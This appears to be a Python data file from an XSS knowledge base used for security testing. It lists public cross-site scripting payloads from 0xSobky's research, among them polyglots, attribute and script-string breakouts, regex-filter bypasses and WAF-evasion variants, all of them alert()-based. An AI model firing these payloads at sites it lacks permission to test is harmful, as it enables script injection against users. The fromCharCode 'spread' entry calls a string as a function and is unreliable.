#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Source: 0xSobky HackVault
URL: https://github.com/0xSobky/HackVault
Wiki: https://github.com/0xSobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
Author: Ahmed Elsobky (0xSobky)

Ultimate XSS Polyglot and related research.
"""

from ..models import Encoding, PayloadEntry, Reliability, Severity


SOBKY_PAYLOADS = {
    # === The Ultimate XSS Polyglot ===
    # Full version with all context breaks
    "sobky-ultimate-polyglot-full": PayloadEntry(
        payload="jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        contexts=["html_content", "javascript", "html_attribute", "url", "css", "template"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="0xSobky Ultimate XSS Polyglot - works in 20+ contexts",
        tags=["0xsobky", "polyglot", "ultimate", "universal", "multi-context"],
        reliability=Reliability.HIGH,
        encoding=Encoding.MIXED,
        waf_evasion=True,
    ),
    # === Polyglot Components (for understanding/customization) ===
    # JavaScript protocol starter
    "sobky-poly-js-protocol": PayloadEntry(
        payload="jaVasCript:/*-/*`/*\\`/*'/*\"/**/(",
        contexts=["url", "html_attribute"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Polyglot component: JavaScript protocol with comment starters",
        tags=["0xsobky", "polyglot", "component", "protocol"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # onClick event injection
    "sobky-poly-onclick": PayloadEntry(
        payload="/* */oNcLiCk=alert() )",
        contexts=["html_attribute", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=6.5,
        description="Polyglot component: onClick with comment prefix",
        tags=["0xsobky", "polyglot", "component", "onclick"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
    ),
    # CRLF injection for header context
    "sobky-poly-crlf": PayloadEntry(
        payload="//%0D%0A%0d%0a//",
        contexts=["header", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=6.0,
        description="Polyglot component: CRLF sequence for line breaks",
        tags=["0xsobky", "polyglot", "component", "crlf"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.URL,
    ),
    # Tag breakers
    "sobky-poly-tag-breakers": PayloadEntry(
        payload="</stYle/</titLe/</teXtarEa/</scRipt/--!>",
        contexts=["html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Polyglot component: Multiple closing tags for context escape",
        tags=["0xsobky", "polyglot", "component", "tag-break"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # SVG with hex escape
    "sobky-poly-svg-hex": PayloadEntry(
        payload="\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        contexts=["html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Polyglot component: SVG with hex-escaped brackets",
        tags=["0xsobky", "polyglot", "component", "svg", "hex"],
        reliability=Reliability.HIGH,
        encoding=Encoding.HEX,
        waf_evasion=True,
    ),
    # === Variations of Ultimate Polyglot ===
    # Shorter version
    "sobky-polyglot-short": PayloadEntry(
        payload="'\"-->]]>*/</script></style></title></textarea><svg/onload=alert()>",
        contexts=["html_content", "javascript", "css"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="0xSobky short polyglot - essential context breaks",
        tags=["0xsobky", "polyglot", "short"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # IMG variant
    "sobky-polyglot-img": PayloadEntry(
        payload="'\"-->]]>*/</script></style></title></textarea><img src=x onerror=alert()>",
        contexts=["html_content", "javascript", "css"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="0xSobky polyglot with img onerror",
        tags=["0xsobky", "polyglot", "img"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # Body variant
    "sobky-polyglot-body": PayloadEntry(
        payload="'\"-->]]>*/</script></style></title></textarea><body onload=alert()>",
        contexts=["html_content", "javascript", "css"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="0xSobky polyglot with body onload",
        tags=["0xsobky", "polyglot", "body"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # === Context-Specific Polyglots ===
    # HTML attribute context
    "sobky-attr-polyglot": PayloadEntry(
        payload='" onmouseover=alert() x="',
        contexts=["html_attribute"],
        severity=Severity.MEDIUM,
        cvss_score=6.5,
        description="Attribute injection polyglot",
        tags=["0xsobky", "polyglot", "attribute"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
    ),
    "sobky-attr-polyglot-v2": PayloadEntry(
        payload="' onclick=alert() '",
        contexts=["html_attribute"],
        severity=Severity.MEDIUM,
        cvss_score=6.5,
        description="Single quote attribute injection",
        tags=["0xsobky", "polyglot", "attribute", "single-quote"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
    ),
    # JavaScript string context
    "sobky-js-string-polyglot": PayloadEntry(
        payload="'-alert()-'",
        contexts=["javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="JS string escape with subtraction operator",
        tags=["0xsobky", "polyglot", "javascript", "string"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
    ),
    "sobky-js-template-polyglot": PayloadEntry(
        payload="`-alert()-`",
        contexts=["javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="JS template literal escape",
        tags=["0xsobky", "polyglot", "javascript", "template"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
    ),
    # URL context
    "sobky-url-polyglot": PayloadEntry(
        payload="javascript:/**/alert()//",
        contexts=["url", "html_attribute"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="JavaScript URL with comment bypass",
        tags=["0xsobky", "polyglot", "url", "javascript"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
    ),
    # === Advanced Techniques from Wiki ===
    # Comment nesting
    "sobky-comment-nest": PayloadEntry(
        payload="/*`/*\\`/*'/*\"/**/",
        contexts=["javascript", "css"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Multi-style comment nesting for context escape",
        tags=["0xsobky", "comment", "nesting", "escape"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # String delimiter chaos
    "sobky-delimiter-chaos": PayloadEntry(
        payload="'\"'\"'\"'\"",
        contexts=["html_attribute", "javascript"],
        severity=Severity.LOW,
        cvss_score=4.0,
        description="Quote delimiter confusion attack",
        tags=["0xsobky", "delimiter", "confusion"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
    ),
    # HTML comment break
    "sobky-html-comment-break": PayloadEntry(
        payload="--!><svg/onload=alert()>",
        contexts=["html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="HTML comment break with --!>",
        tags=["0xsobky", "comment", "break", "html"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # CDATA break
    "sobky-cdata-break": PayloadEntry(
        payload="]]><svg/onload=alert()>",
        contexts=["html_content", "xml"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="CDATA section break",
        tags=["0xsobky", "cdata", "break", "xml"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # === Regaxor-based fuzzing patterns ===
    # (from regaxor.js - regex axe for finding bypasses)
    "sobky-regex-bypass-1": PayloadEntry(
        payload="<scr<script>ipt>alert()</scr</script>ipt>",
        contexts=["html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Nested tag regex bypass",
        tags=["0xsobky", "regaxor", "regex", "bypass", "nested"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "sobky-regex-bypass-2": PayloadEntry(
        payload="<script x>alert()</script>",
        contexts=["html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Script with garbage attribute",
        tags=["0xsobky", "regaxor", "regex", "bypass"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "sobky-regex-bypass-3": PayloadEntry(
        payload="<script/x>alert()</script>",
        contexts=["html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Script with slash attribute separator",
        tags=["0xsobky", "regaxor", "regex", "bypass"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # === fromCharCode obfuscation ===
    "sobky-fromcharcode": PayloadEntry(
        payload="<script>alert(String.fromCharCode(88,83,83))</script>",
        contexts=["html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="fromCharCode string building",
        tags=["0xsobky", "fromCharCode", "obfuscation"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "sobky-fromcharcode-spread": PayloadEntry(
        payload="<script>[...String.fromCharCode(97,108,101,114,116)].reduce((a,b)=>a+b)(1)</script>",
        contexts=["html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="fromCharCode with spread and reduce",
        tags=["0xsobky", "fromCharCode", "spread", "es6"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}
